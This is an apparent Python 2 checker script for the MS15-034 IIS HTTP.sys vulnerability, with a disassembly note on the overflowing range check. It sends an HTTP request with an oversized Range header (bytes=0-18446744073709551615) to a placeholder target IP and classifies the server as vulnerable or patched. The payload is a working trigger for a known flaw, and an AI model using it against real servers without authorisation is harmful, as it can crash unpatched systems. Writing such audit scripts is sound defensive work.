'''
___.                                   .___ __                         __
\_ |__   ____ ___.__. ____   ____    __| _//  |________ __ __  _______/  |_
 | __ \_/ __ <   |  |/  _ \ /    \  / __ |\   __\_  __ \  |  \/  ___/\   __\
 | \_\ \  ___/\___  (  <_> )   |  \/ /_/ | |  |  |  | \/  |  /\___ \  |  |
 |___  /\___  > ____|\____/|___|  /\____ | |__|  |__|  |____//____  > |__|
     \/     \/\/                \/      \/                        \/
                                                            MS15-034 Checker

Danger! This script has not been properly qa'd and will probably fail in terrible ways.
It is based off a change in HTTP!UlpParseRange in which an error code is returned as a
result of a call to HTTP!RtlULongLongAdd when evaluating the upper and lower range of
an HTTP range request.
-BF


8a8b2112 56              push    esi
8a8b2113 6a00            push    0
8a8b2115 2bc7            sub     eax,edi
8a8b2117 6a01            push    1
8a8b2119 1bca            sbb     ecx,edx
8a8b211b 51              push    ecx
8a8b211c 50              push    eax
8a8b211d e8bf69fbff      call    HTTP!RtlULongLongAdd (8a868ae1) ; here

'''
import socket
import random

ipAddr = "IP_A_ATACAR"
hexAllFfff = "18446744073709551615"

req1 = "GET / HTTP/1.0\r\n\r\n"
req = "GET / HTTP/1.1\r\nHost: stuff\r\nRange: bytes=0-" + hexAllFfff + "\r\n\r\n"

print "[*] Audit Started"
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((ipAddr, 80))
client_socket.send(req1)
boringResp = client_socket.recv(1024)
if "Microsoft" not in boringResp:
                print "[*] Not IIS"
                exit(0)
client_socket.close()
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((ipAddr, 80))
client_socket.send(req)
goodResp = client_socket.recv(1024)
if "Requested Range Not Satisfiable" in goodResp:
                print "[!!] Looks VULN"
elif " The request has an invalid header name" in goodResp:
                print "[*] Looks Patched"
else:
                print "[*] Unexpected response, cannot discern patch status"
